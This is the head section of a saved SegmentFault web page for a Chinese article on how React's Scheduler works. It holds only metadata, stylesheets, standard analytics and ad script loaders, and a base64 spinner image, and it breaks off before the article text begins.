<!DOCTYPE html>
<!-- saved from url=(0043)https://segmentfault.com/a/1190000039101758 -->
<html lang="zh"><head data-locator-hook-status-message="Unsupported React renderer, only bundle type 1 (development) is supported but 0 (production) is found"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>javascript - 一篇长文帮你彻底搞懂React的调度机制原理 - React的秘密 - SegmentFault 思否</title><meta name="keywords" content="javascript,前端,react.js"><meta name="description" content="Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Sch..."><meta name="userId" id="SFUserId"><meta name="userRank" id="SFUserRank"><meta rel="apple-touch-icon" href="https://static.segmentfault.com/main_site_next/d778cb88/touch-icon.png"><meta name="msapplication-square150x150logo" content="https://static.segmentfault.com/main_site_next/d778cb88/touch-icon.png"><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><meta name="renderer" content="webkit"><meta name="alexaVerifyID" content="LkzCRJ7rPEUwt6fVey2vhxiw1vQ"><meta name="apple-itunes-app" content="app-id=958101793, app-argument="><meta property="qc:admins" content="15317273575564615446375"><meta name="msapplication-TileColor" content="#009a61"><meta name="sogou_site_verification" content="MKVKCoIjwL"><meta name="360-site-verification" content="737314c9bf48873a1a0a22295203d9d1"><link rel="shortcut icon" type="image/x-icon" href="https://static.segmentfault.com/main_site_next/d778cb88/favicon.ico"><link rel="search" type="application/opensearchdescription+xml" href="https://segmentfault.com/opensearch.xml" title="SegmentFault"><link rel="alternate" type="application/atom+xml" href="https://segmentfault.com/feeds/questions" title="SegmentFault \u6700\u65B0\u95EE\u9898"><link rel="alternate" type="application/atom+xml" href="https://segmentfault.com/feeds/blogs" title="SegmentFault \u6700\u65B0\u6587\u7AE0"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@segment_fault"><meta name="twitter:creator" content="@segmentfault"><meta name="twitter:title" content="一篇长文帮你彻底搞懂React的调度机制原理"><meta name="og:type" content="article"><meta name="og:title" content="一篇长文帮你彻底搞懂React的调度机制原理"><meta name="og:description" content="Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Sch..."><meta name="og:url" content="https://segmentfault.com/a/1190000039101758"><meta name="og:site_name" content="SegmentFault 思否"><meta name="msvalidate.01" content="2C018C53297C8388F3E7052F5E9CA6AF"><meta name="event-object" value="{&quot;current&quot;: [&quot;article&quot;, [&quot;1190000039101758&quot;]], &quot;root&quot;: [&quot;article&quot;, &quot;1190000039101758&quot;]}" id="SFEventObject"><link rel="canonical" href="https://segmentfault.com/a/1190000039101758"><meta name="keywords" content="javascript,前端,react.js"><meta name="description" content="Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Sch..."><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta name="twitter:image" content="https://static.segmentfault.com/main_site_next/d778cb88/touch-icon.png"><meta name="og:image" content="https://static.segmentfault.com/main_site_next/d778cb88/touch-icon.png"><script async="" defer="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script id="howxm" type="text/javascript" defer="" src="./彻底搞懂React的调度机制原理_files/sdk-body-d729921b.js"></script><script async="" defer="" src="./彻底搞懂React的调度机制原理_files/fl.js"></script><script async="" defer="" src="./彻底搞懂React的调度机制原理_files/spc.php"></script><script type="application/ld+json">{
            "@context": "https://schema.org",
            "@type": "Article",
            "mainEntityOfPage": {
              "@type": "WebPage",
              "@id": "https://google.com/article"
            },
            "name": "一篇长文帮你彻底搞懂React的调度机制原理",
            "headline": "一篇长文帮你彻底搞懂React的调度机制原理",
            "image": "https://static.segmentfault.com/main_site_next/d778cb88/touch-icon.png",
            "datePublished": "2021-01-27T05:11:07.000Z",
            "dateModified": "2021-02-26T10:29:50.000Z",
            "url": "https://segmentfault.com/a/1190000039101758",
            "author": {
              "@type": "Person",
              "name": "nero"
            },
            "publisher": {
              "@type": "Organization",
              "name": "SegmentFault",
              "logo": {
                "@type": "ImageObject",
                "url":
                  "https://assets.segmentfault.com/v-5fc4b0b2/global/img/static/touch-icon.png"
              }
            }
          }</script><meta name="next-head-count" content="35"><link data-next-font="size-adjust" rel="preconnect" href="https://segmentfault.com/" crossorigin="anonymous"><link rel="preload" href="./彻底搞懂React的调度机制原理_files/2f6bb54438d0eb1d.css" as="style"><link rel="stylesheet" href="./彻底搞懂React的调度机制原理_files/2f6bb54438d0eb1d.css" data-n-g=""><noscript data-n-css=""></noscript><script defer="" nomodule="" src="./彻底搞懂React的调度机制原理_files/polyfills-c67a75d1b6f99dc8.js"></script><script src="./彻底搞懂React的调度机制原理_files/webpack-c5347bcefe005ee1.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/framework-c16fc4c01675a4d8.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/main-f6695b7b84c088ba.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/_app-991d280d7b96bfca.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/4312-925c9b46eb0652d4.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/9706-a314ed127d0d4220.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/7343-637b821bf3ce9bb4.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/3345-9fcec174bf7d2aa4.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/6534-4c4937718f03a1e6.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/4156-563040a1d8fda5b6.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/Detail-b5b26ba0869b2022.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/_buildManifest.js" defer=""></script><script src="./彻底搞懂React的调度机制原理_files/_ssgManifest.js" defer=""></script><style id="__jsx-a3f67dc5d7670453">@media(min-width:1400px){.container{max-width:1320px}}.blog-header.theme-light input{background-color:rgba(33,37,41,.1)}.blog-header.theme-light input::-webkit-input-placeholder{color:rgba(var(--bs-dark-rgb),var(--bs-text-opacity))}.blog-header.theme-dark input{background-color:rgba(255,255,255,.1)}.blog-header.theme-dark input::-webkit-input-placeholder{color:rgba(var(--bs-light-rgb),var(--bs-text-opacity))}</style><style id="__jsx-9cb70f41b3d6a2e1">.article-content{margin-bottom:1.5rem}.article-content .userExcerpt p{margin-bottom:0!important}.article-content .col-md-90{width:120px}.article-content pre{position:relative}.right-side .right-block{margin-bottom:1.5rem}#article-header{border-top:2px solid#00965e}@media(max-width:767.98px){.article-content .col-md-90{width:100%}}@media(max-width:575.98px){.article-content.container{padding:0;padding-bottom:56px;padding-bottom:-webkit-calc(56px + constant(safe-area-inset-bottom));padding-bottom:-moz-calc(56px + constant(safe-area-inset-bottom));padding-bottom:calc(56px + constant(safe-area-inset-bottom));padding-bottom:-webkit-calc(56px + env(safe-area-inset-bottom));padding-bottom:-moz-calc(56px + env(safe-area-inset-bottom));padding-bottom:calc(56px + env(safe-area-inset-bottom));overflow-x:hidden}}</style><style id="__jsx-ce2346a4ac7d50cb">@charset "UTF-8";.fmt,.tui-editor-contents,.preview-wrap{line-height:1.6}.fmt p,.fmt address,.fmt ul,.fmt ol,.fmt dl,.fmt pre,.fmt blockquote,.fmt table,.fmt figure,.fmt hr,.tui-editor-contents p,.tui-editor-contents address,.tui-editor-contents ul,.tui-editor-contents ol,.tui-editor-contents dl,.tui-editor-contents pre,.tui-editor-contents blockquote,.tui-editor-contents table,.tui-editor-contents figure,.tui-editor-contents hr,.preview-wrap p,.preview-wrap address,.preview-wrap ul,.preview-wrap ol,.preview-wrap dl,.preview-wrap pre,.preview-wrap blockquote,.preview-wrap table,.preview-wrap figure,.preview-wrap hr{margin-bottom:1.25rem}.fmt p,.tui-editor-contents p,.preview-wrap p{word-wrap:break-word;word-break:break-all}.fmt ol ol,.fmt ol ul,.fmt ul ol,.fmt ul ul,.tui-editor-contents ol ol,.tui-editor-contents ol ul,.tui-editor-contents ul ol,.tui-editor-contents ul ul,.preview-wrap ol ol,.preview-wrap ol ul,.preview-wrap ul ol,.preview-wrap ul ul{margin-bottom:0}.fmt li>p:last-of-type,.tui-editor-contents li>p:last-of-type,.preview-wrap li>p:last-of-type{margin-bottom:0!important}.fmt h1,.tui-editor-contents h1,.preview-wrap h1{font-size:2rem;margin:2.75rem 0 1rem;padding-bottom:.5rem;border-bottom:3px double rgba(0,0,0,.1)}.fmt h2,.tui-editor-contents h2,.preview-wrap h2{font-size:1.75rem;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px double rgba(0,0,0,.1)}.fmt>h2:first-child,.tui-editor-contents>h2:first-child,.preview-wrap>h2:first-child{margin-top:0}.fmt h3,.tui-editor-contents h3,.preview-wrap h3{font-size:1.5rem;margin:2.25rem 0 1rem}.fmt h4,.tui-editor-contents h4,.preview-wrap h4{font-size:1.25rem;margin:2rem 0 1rem}.fmt h5,.tui-editor-contents h5,.preview-wrap h5{font-size:1rem;margin:1.75rem 0 1rem}.fmt h6,.tui-editor-contents h6,.preview-wrap h6{font-size:1rem;margin:1.5rem 0 .5rem}.fmt h6::before,.tui-editor-contents h6::before,.preview-wrap h6::before{content:"❐";margin-right:.25rem}.fmt blockquote,.tui-editor-contents blockquote,.preview-wrap blockquote{padding-left:1rem;border-left:.25rem solid#e9ecef}.fmt pre,.tui-editor-contents pre,.preview-wrap pre{padding:1rem;max-height:35rem;line-height:1.5;background-color:#e9ecef;overflow:auto}.fmt pre code,.tui-editor-contents pre code,.preview-wrap pre code{word-wrap:normal;overflow-wrap:normal;white-space:inherit}.fmt hr,.tui-editor-contents hr,.preview-wrap hr{margin:2rem auto;max-width:160px;border-top-width:1px;background-color:rgba(0,0,0,.5)}.fmt img,.tui-editor-contents img,.preview-wrap img{max-width:100%;height:auto}.fmt table,.tui-editor-contents table,.preview-wrap table{border:1px solid#dee2e6;width:100%;table-layout:fixed}.fmt table td,.fmt table th,.tui-editor-contents table td,.tui-editor-contents table th,.preview-wrap table td,.preview-wrap table th{padding:.75rem;border:1px solid#dee2e6;word-wrap:break-word}.fmt table [align="center"],.tui-editor-contents table [align="center"],.preview-wrap table [align="center"]{text-align:center}.fmt table [align="right"],.tui-editor-contents table [align="right"],.preview-wrap table [align="right"]{text-align:right}.fmt table thead th,.tui-editor-contents table thead th,.preview-wrap table thead th{border-bottom-width:2px;background-color:#e9ecef;color:#212529;font-weight:bold}.fmt table tbody tr:hover,.tui-editor-contents table tbody tr:hover,.preview-wrap table tbody tr:hover{background-color:rgba(0,0,0,.025)}.fmt .img-wrap,.tui-editor-contents .img-wrap,.preview-wrap .img-wrap{display:block;text-align:center}article.fmt a img{cursor:pointer}article.fmt img{cursor:-webkit-zoom-in;cursor:-moz-zoom-in;cursor:zoom-in}article.fmt p>img{display:block;margin:0 auto}</style><style id="__jsx-986f121867ae534">.operation .dropdown-toggle::after{display:none}</style><style id="__jsx-80ca17bf1a64be8">.nav-header{cursor:pointer}#collapseTarget{max-height:360px;overflow-y:auto}</style><style id="__jsx-e7ade88cc0ab8362">.quote .delete-quote{visibility:hidden}.quote .list-group-item:hover .delete-quote{visibility:visible}</style><style id="__jsx-a71179a83a8815ea">.recommend-list-wrap .card-header{-webkit-box-shadow:0rem -.06rem 0rem 0rem rgba(0,0,0,.13)inset;-moz-box-shadow:0rem -.06rem 0rem 0rem rgba(0,0,0,.13)inset;box-shadow:0rem -.06rem 0rem 0rem rgba(0,0,0,.13)inset}.mr-13{margin-right:13px}</style><style id="__jsx-78891ba36deccadf">.comment-wrap .media-body .fmt,.comment-wrap .media-body .fmt>p:first-child{display:inline}.comment-wrap .media-body .fmt>p:first-child::after{display:block;content:"";margin-bottom:1.25rem}.comment-wrap .media-body .fmt>p:last-child::after{display:none!important}.comment-wrap .commentUnit:hover .control-area,.comment-wrap .commentUnit:hover .comment-control-area{display:-webkit-box!important;display:-webkit-flex!important;display:-moz-box!important;display:-ms-flexbox!important;display:flex!important}.comment-wrap .comment-reply{overflow:hidden;word-wrap:break-word;overflow-wrap:break-word;resize:none}.comment-wrap .dropdown-item.active,.comment-wrap .dropdown-item:active{background:#f8f9fa!important;color:inherit!important}.comment-wrap .reply-list .list-group-item{background-color:unset}</style><style id="__jsx-d6a7c16d4796689">.mentions-wrap .dropdown-toggle::after{display:none}</style><style type="text/css">#waf_nc_block{position:fixed;_position:absolute;width:100%;height:100%;top:0;bottom:0;left:0;z-index:99999}.waf-nc-mask{background:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%}.waf-nc-wrapper{width:348px;height:236px;text-align:center;position:absolute;top:50%;left:50%;margin-top:-160px;margin-left:-200px;margin-bottom:16px;background:#fff;box-shadow:0 0 10px 0 rgba(0,0,0,0.15)}.waf-nc-title{margin-top:28px;font-size:24px;font-weight:500;color:#181818;letter-spacing:1.71px;text-align:center}.waf-nc-description{margin-top:24px;font-size:14px;color:#666;text-align:center}.waf-nc-traceid-class{margin-top:8px;font-size:12px;color:#999;text-align:center}#nocaptcha{margin-left:24px;margin-top:14px}.nc_bg{background:#fff3ea!important}.btn_slide{background:#ff6a00!important;border:0!important;color:#fff!important;width:48px!important;height:48px!important;font-size:30px;font-weight:900!important;line-height:48px!important}.btn_ok{background:#ff6a00!important;border:0!important;color:#fff!important;width:48px!important;height:48px!important;font-size:30px;font-weight:900!important;line-height:48px!important}.nc_scale{background:rgba(241,241,242,1)!important;height:48px!important}.nc-lang-cnt{height:48px!important;margin-left:10px!important;line-height:48px!important;font-size:14px!important}</style><script src="./彻底搞懂React的调度机制原理_files/awsc.js"></script><style type="text/css" data-styled-jsx=""></style><script id="howxm-init-script" appid="1e44f983-123d-498f-b33d-e71dae65ae9d" crossorigin="anonymous">function _howxm(){_howxmQueue.push(arguments)}window._howxmQueue=window._howxmQueue||[],_howxm("setAppID","1e44f983-123d-498f-b33d-e71dae65ae9d"),function(){if(!document.getElementById("howxm_script")){var e=document.createElement("script"),t=document.getElementsByTagName("script")[0];e.setAttribute("id","howxm_script"),e.type="text/javascript",e.async=!0,e.src="https://static.howxm.com/sdk.js",t.parentNode.insertBefore(e,t)}}();</script><style type="text/css">.modalWidget_widgetTransition__iHARV {
  transition: height 0.3s;
}

.modalWidget_widget__J6QdN {
  width: 100%;
  overflow: hidden;
  max-height: 70vh;
  display: block !important;
  height: 74px;
  background: var(--background-color) url("data:image/gif;base64,R0lGODlhKAAoAPUAAMzMzM3Nzc/Pz9LS0tTU1NbW1tjY2Nvb297e3t/f3+Hh4enp6evr6/Dw8PLy8vPz8/T09Pb29vj4+Pr6+tPT09XV1eLi4ubm5ujo6Orq6vHx8ff399HR0dfX19nZ2dzc3N3d3ePj4+/v7/n5+dDQ0ODg4OXl5fX19eTk5Ozs7M7Ozufn5+7u7u3t7cvLy9ra2vv7+wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh+QQJAgAUACwAAAAAKAAoAAAFcCAljmRpnmiqrmzrvnAsz3RNTfbbEICRtwiAUPFbMYTCRTE14SEhSxQE2YuijkiG9XRAFramB9UBLhmQxPJo4VWPIlT3KPCUU5wAsrxQ3/fdeBF2dEJ2E3GDQgd2FAwDCRKMkpOUlZaXmJmam5ydLyEAIfkECQQAAgAsAAAAACgAKAAABXGgII5kaZ5oqq5s675wLM90bcsXgN1tA/wI3krz+2WEqkoRsEGiIMuDE8VYOqanQ1GKLT2Wk27JUDyKR5jteRQpUtajQBEuohSb8MKdrv9B+Htwcj90bT9vcGlAgEZ0YIxBdAIWDJKWl5iZmpucnZ6XIQAh+QQJAgACACwAAAAAKAAoAAAGhUCBcEgsGo/IpHLJbDqf0Kh0Sq1ap6PJ1RkCAApbJsULyISVCnJAckZG1KA2kqHWyI8H8uFuhKjZfEQeZAuBRBh6hkNvZIpDAY2OAmNegIoFZBGSmJWbmZKQXpKMX5KIXh+eXhiOfp+XiYp0ZA2KpACpsK+BEmpmjpRxowkiksbHyMnKVUEAIfkECQQAAgAsAAAAACgAKAAABoZAgXBILBqPyKRyyWw6n9CodEqtWq9YponCyC5NgDDGm8SEwxIy8gwAqY8MtuNtPJwR9OKDPckTPWddfkJmYW6DAhtsiEIBZ4wCFGdpiAWTjJZomJeIjmGMio+IhW2bYoh7nH52hqNygyeepX4bkqpvJ7anfrqzeRlsJah3kCYeCpDJystSQQAh+QQJAgACACwAAAAAKAAoAAAGlECBcEgsGo/IpHLJbDqf0Kh0Sq1ar9isVmCqeFDbpAdAloSPYzLibEyRy+zi4b2ODx9vgJ2YBmT2Qhh0gAIbbxSEAgFviRRvG4QFj5GTgI5wgItkhIZkiICCapRkDIB4lXZzonsMeQ97J5oAdXEbl5hsELd+dq15FrWqg2cMfW9gZxV5b6Vnp7+QcZJqr7AYFtGJT0EAIfkECQQAAgAsAAAAACgAKAAABphAgXBILBqPyKRyyWw6n9CodEqtWq/YrHZo2ipHgPDIe1yFARWyEXx2qIufM+hNfJwBE/rQcGbohRhyfwIbZxSDAgFniBRnY38FbYORYpOOg4phg4Vhh3+BYXOQfX92l3pxoZ93D3onmQCibxuNp2oQtWF+bwywACizqYJeGxh8d79bIrnIAbtZnM2xG8TSIG5qJXIZj4hPQQAh+QQJAgAGACwAAAAAKAAoAAAGn0CDcEgsGo/IpHLJbDqf0Kh0Sq1ar9isdsvdjkqUVPd4AZgh4yLLDLCkiRD24E30sBd0IYaNyBsicn4GAWwTfhRsaHkFiYeNi2yChGZ+gGYffntmKH52Z3lxZhSdd3kpcht0J5NtqgOBbxCvj2OnbK1jEB+3uFInEBFGERietxdUZXIFy6y3FSxVxbzTvVS21HIrqVgXHczOCIq5DttRQQAh+QQJBAAEACwAAAAAKAAoAAAGpECCcEgsGo/IpHLJbDqf0Kh0Sq1ar9isdsvtepMWEoj1LQLOlDLxfFYPPeyUm4Bhg+YbNmBOCLD5FGwScx2ChIZugWeDbn5tbnl/bnVnd25wZxmQehOXdpN6D2onjgCWXxsDnGUQqnFlKaWmUCkLJ0wPIHqzTxd2GBtGGxiYeihRJbtoHcyyeppRLALK1HogjFINxdV2DlgTC9vWtl4SDw3oI1FBACH5BAkCAAIALAAAAAAoACgAAAawQIFwSCwaj8ikcslsOp/QqHRKrVqv2Kx2y+16v2CuxxEmAs6ZsuB0BhTUm3ZALQi06YT2SF3Q8/1leWd7ZXZncHJqGG0If2hlD3ITZR+MZQxyZEiEVWyWRyMDbpxRG6KARiVtBCdSJ6ePSA1yAQxQmHIWS5VyHw9MD7yfSxa0bhgbRhsYHsYhTyvGqwXUhsa2UBp90txnCKS3sN3emlYsCCTSAwgMk1wjDiwtIg/uT0EAIfkECQQAAgAsAAAAACgAKAAABqlAgXBILBqPyKRyyWw6n9CodEqtWq/YrHbL7Xq/4LBYMBoPQwBAyjxIk9hueLosLrgjY/s8fx8H4mIRbhRjGG4IfGkZgW4AE0UXHhpaB4dFDm5rVwyNDkUpnVaClpcug3RSG219RpynqauKSRaNAQxQrqSztQcPTA+VjSVNtLwYeJcYBrUAIU8ZzMIFFH/Rt1AbCNHbh6hRDtrcwr5XEwwIscKLXxEQ7lJBACH5BAkCAAIALAAAAAAoACgAAAa7QIFwSCwaj8ikcslsOp/QqHRKrVqv2Kx2y+16v+CweEwum50OA8VEzgDe5MobcBpT5hJBQ43yBuZCF3hcEXMAQnJvGFwYcx+BjlwGcwxCE4YPWg+GRB+RWZ5vj0MahpVXDJhFoW91VSd/okaFcxR5UxJ3g0YLhrZSJ7qKSQqGAadOqYYhS8WGH5lLD6yyTCHGAAYYEbMYk8bMydi1FeWx2BlREtTj49BUae3Y71cjCx/CzxkTXxIn/1KCAAAh+QQJBAACACwAAAAAKAAoAAAGv0CBcEgsGo/IpHLJbDqf0Kh0Sq1ar9isdsvter/gsHhMLpupGgQGQqYAABiv5G0SQN6AireDF+IDXgF9Am5vEVwRf0IfeHFbGHgIQhmRXB6NQhN/bFl3eBNDjG8fWqIAkkMafwxYDJtFpgEnVieCo0ZzeBQSVBKFhkeUurNREL9wSSh/AaxPrn8WSyXLH5xKELGnTcrUa7gYl8sozst/FR3otuXNTxHZ5fAIvFNp8PHWVRMLCMeRDKByIJyYByUIACH5BAkCAAIALAAAAAAoACgAAAa8QIFwSCwaj8ikcslsOp/QqHRKrVqv2Kx2y+16v+DwREFJhYcJgPosVKkBbME7wN68KfV7Xl3ZA/pnE3NxJG8RbC9vGFwbBhQXQwtvL1xpa0KChloPg2iTWol8RA5zDFgMcw5FIKlWEQGfRXZ3G1QbA61GkrRSELiKSQpzAaZPqHMhS6xzLw9MD6FvCk3Cwy8Yh7IYBsMAyU4Y3XcV5LDixU8Ry+LsACC1Uw7r7WrvWBMM88wME18bEQClBAEAIfkECQQAAgAsAAAAACgAKAAABrRAgXBILBqPyKRyyWw6n9CodEqtWq/YrHbL7XqjFwAg8iVOVGJCecgQA0prIciNiQs4bnLcHbBH3GpxD4B+hIKGe252d3l2c2J1cW1iL4WNWiUEJ0WPAJVZnUUOfAxYk2JGnQGbVScBiEMSfJpUsnwSRxizrFCupEklfAGlT6eQS6qeD0wPL8JwTMHCLxh6Zhgdwm/F2oAd36/dxE8Syd3aILhTzefoy1cTDOaUDBNfEif5UkEAIfkECQIAAgAsAAAAACgAKAAABrhAgXBILBqPyKRyyWw6n9CodEqtWq9YrIXgMWWVEoCY8E1+xABy2ehAA1hr41n8iRcn7oediEF79kRzABiAQxxoEYVCbooCG2gUjRB+kpSKj2ONAoyNFIiNgoSKGZaFeJ+KgnWKGm4poHmXbhQSVBMoFK9JpJCJURCeYksWbgG6TikBbhPDxR96Sw+CmUzEzhi+RBEYHsWDT7zeAVwdweIZv9Pi4s9UDurrAO1XEynwdBnMdhsR/VJBACH5BAkEAAIALAAAAAAoACgAAAa8QIFwSCwaj8ikcslsOp/QqHRKrT4bKevTAwB4tMxMtwsBJzdjrzn5SZfXRk06Cze2u5+6ceTWF8V4fkV3ABiCRANjEYdDaYxCfF0UjwIRYwWUlpKZl5QCjpQcipSEho8YnY+RZKRjeY9yY3SMhAGLjKsAFCOnabtTvE0WaQGzTSmJCU4JxB8PTA+1G8vEXhi3RBEYXL5QgNUBBAXjAeAAylAbtebVCcFS0ezNDmATKR+J7RkTgiMREO+eBAEAIfkECQIABgAsAAAAACgAKAAABrFAg3BILBqPyKRyyWw6n9DoM5HAPKRRC2CLwk63XG9TCxaMxMtMeXBCKyVriVv5KbfnSE05hU/Wtx99SBN2gkcpYB6GR38AGItGA2ARkEVllURwWxSYQyeJnUKfm6EGmgAEpQaXpZJblKGNj6GIgKWEk6WNgaEPe7qFnaeocp1qwZhkYHydCWUAH1fJz9BWRhENGmi11AEEBeABoGISjd3U0uTm59B9EynriQmYEif2UkEAIfkECQQABgAsAAAAACgAKAAABrBAg3BILBqPyKRyyWw6n0mJyQStDjOA7McKtWSzA64z8c2mxExv+YxWYr+DU1spCcAlc+Xnnk861n1Je1qBSBNlD4VHbwAeikeDABiPRgNfEZRFZZlEdWCcQydwoEKin6SejaRCm6uWWZikkZOkjI6oiKuRW7hfbKCRAXKgqY14oCllBMOcKGUBv5lkZR+Jzc+NGLGPjNgEBeAE0WgSwdhfhQ7m2BOKEynrAhaoJ/VWQQAh+QQJAgACACwAAAAAKAAoAAAGo0CBcEgsGo/IpHLJbEIMJVFzeoyAAFgOdStcZbMS7vT6BazEzUP5AEEzydmUm2kqR+ZLhx2/NHzbfEkiX3KBSWpYB4ZJI3+LSBlZBo9IcBiURwNgmEZfnEUSnp9DEZKjpKanAqFZqkKiqgSbqpauKamnE460uKN6ca5wAXe5AV9hp5G7oxZlhcxrgJ/Naxgjn7dlWBafEsKtvsIgrhMXBFGuj0EAIfkECQQAAgAsAAAAACgAKAAABp5AgXBILBqPyCQSJlE6n0PHBwB4Qa/G05RKPWG/GC538MUmxNTXpgzdcj8QdhvNkEMX4oHX7tzk13xObgFxgUoQYnWGSm4fi0owYoWPRwxvlEluGJhIkpxHYp9ZY6JFJ5elUaipAn5UBKxDobECnrGatJZptJFck6mNtIhciqxnvrESf7G6r3upIXS3aHDGaAALrM2vycG5LwkstOOxQQAh+QQJAgACACwAAAAAKAAoAAAGmECBcEgsGo/IZHLRQWmU0KgEVQFYX9HsERWwegfasGDS8ZpR4qyma25O0lFu+wRXmwOLuv1L10NPc35xfIJ/Z4VQJV5YiEoDXn2NR2tXkkteeZZHZVaRmkQkXp9HX6NFgJWmQ6gABaqgqa8CoVayQpwAnqZyAJmvlK22s5C2irGqrL3FhL9ttguHsrwgwmUDT8LZ2tvc3dpBACH5BAkEAAIALAAAAAAoACgAAAaYQIFwSCwaj8gkcsIykBQTpVR6QgCuV8V0W5RYsVgUd4wJgLEGzXiLOgMMmNOafT7I53QwC89lgSl3fFRmV4CCW19XgYdJJ3qMU4kHkINYi5RGZYWYSokYnEkUlqBIYKRHEminRo6bq0Stb6+wqrNDprZCooq5AgdhvZqyuRNgl6uSvRqPub9ZvanPvQIKe9PX2Nna29zd00EAIfkECQIAAwAsAAAAACgAKAAABo7AgXBILBqPyGRSkyAJXiilVMkUAK7XynRLnCiwYICBy01RwljQiTz9hg2YNXv6esvn7XAKXwZT7nxKEhxYf4FbbleAh0gnYHuMUokvkVKDWIuVRSmFmkogWBieSVaKo0hgp0cTnapFjlmur62yQqyxtUOlAbm6WL1CicADEk2Qw8jJysvMzc7P0NHS09JBACH5BAkEAAIALAAAAAAoACgAAAaHQIFwSCwONcakckmcpBABAMDDrDI1UKkWkLJ6h5LsVov8WlPjraFrrirS61Pbmxgf5HP6mJ0/bwd4fVUSfxKCemSHVidbfIpLYgePg1uBk0loUgaXTGIYnEuVoEpbo0mEmqZGjKmqRBpakq5EA1Kfs0cIGGW4vb6/wMHCw8TFxsfIycrLzG1BACH5BAkCAAIALAAAAAAoACgAAAZ7QIFwSCwORw2jcsk8Zj4DgPTTrDIbH6lWm7R6BSPQdgwYfa0Zspbw6Z6ZKLIhc3p7S+ND3X4fZ/hfaWt7gFUjWwNmhVZiXItWDVt/j1WNAAeUVluEmUpxU51Nh1JuoUpPk6aqq6ytrq+wsbKztLW2t7i5uru8vb6/wKtBACH5BAkEAAIALAAAAAAoACgAAAZxQIFwSCwORw2jcsk8XjwcgJSSbFqVF4p0uwVdv0KGlku+gK8IMpfiYZzOTSi5/Yaj53X7ncvQgy9reX5NI4GDXwVcgodMKlt9jFaFUh+RX2kUlmAjmp2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2TEEAIfkECQIAAgAsAAAAACgAKAAABmlAgXBILA4lp5RxyWwKJasDB0AFeJxYZuNV7VKV2fBJ6vU2wtlUuUoovFZorKXsWZ3iaG73cMfHp1VgfnEIVAN9g3EpCHCJjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ukUEAIfkECQQAAgAsAAAAACgAKAAABmFAgXBILA5Hp5NxyWwKR5kDB0ClmpzYZeNT7VazYMEI5C0jwlhTuUoodEwNtLPg9WSU8rCnesDn0SZtGX+EhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6Slpo9BACH5BAkCAAIALAAAAAAoACgAAAZYQIFwSCwOR6ekcclsCkYZEAFApXZMzuzyFKh6rdrwcPr1esTi0pfQab8a6PCoVMqc4vi8fs/v+/+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ15QQAh+QQJBAACACwAAAAAKAAoAAAGVUCBcEgsDiWRpHHJbAodJRVgSlVInFhmiMqdprJgYqLLFYXPIs6UUmkHPpOzPC6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmadUEAIfkECQIAAgAsAAAAACgAKAAABk1AgXBILBZPI6NyyTReAFAoItmsNjnRaMLKVSKy0EF3PGxcCpQAlEFuu9/wuHxOr9vv+Lx+z+/7/4CBgoOEhYaHiImKi4yNjo+QkZKNQQAh+QQJBAACACwAAAAAKAAoAAAGTECBcEgsGo/IpLJ44QBUnctyqhw9rwApdVvEPj3csLBRCVwZ4rTgxFa73/C4fE6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI2Oj5CRRUEAIfkECQIAAQAsAAAAACgAKAAABkrAgHBILBqPyKQSKUmtYMuotAKoIqTYY6PKTWW/wwIXkACbUwYAwcxuu9/wuHxOr9vv+Lx+z+/7/4CBgoOEhYaHiImKi4yNjo+BQQAh+QQJBAABACwAAAAAKAAoAAAGSMCAcEgsGo/IpHLJbDYvAICh4awaOdEow8oNILLSrnX0yW7FY8YZzW673/C4fE6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI15QQAh+QQJAgACACwAAAAAKAAoAAAGTECBcEgsGo/IpHLJbDqFo6f0iAIEOtHplGO1JrTSRNcKfo4O42y5yeB+11I1fE6v2+/4vH7P7/v/gIGCg4SFhoeIiYqLjI2Oj5CRikEAIfkECQQAAQAsAAAAACgAKAAABk3AgHBILBqPyKRyyWw6n9BlI5FgRK8BDmBrxTpH2/DB60SFueQm49xNSzuAysj9pdvv+Lx+z+/7/4CBgoOEhYaHiImKi4yNjo+QkZKSQQAh+QQJAgABACwAAAAAKAAoAAAGVMCAcEgsGo/IpHLJbDqf0Kg0uvJ0DtNoBcANZZ8GbvfbdIjH5OWJcsamlRI2l/BWi+l1pYPgWeX/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJlSQQAh+QQJBAABACwAAAAAKAAoAAAGWcCAcEgsGo/IpHLJbDqf0KhUqvG0plEIYIvAPltbrtc5CANCYyaEYmaklxt2ePNWasOEupKB1ytLYn5JCisagoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnpVBACH5BAkCAAEALAA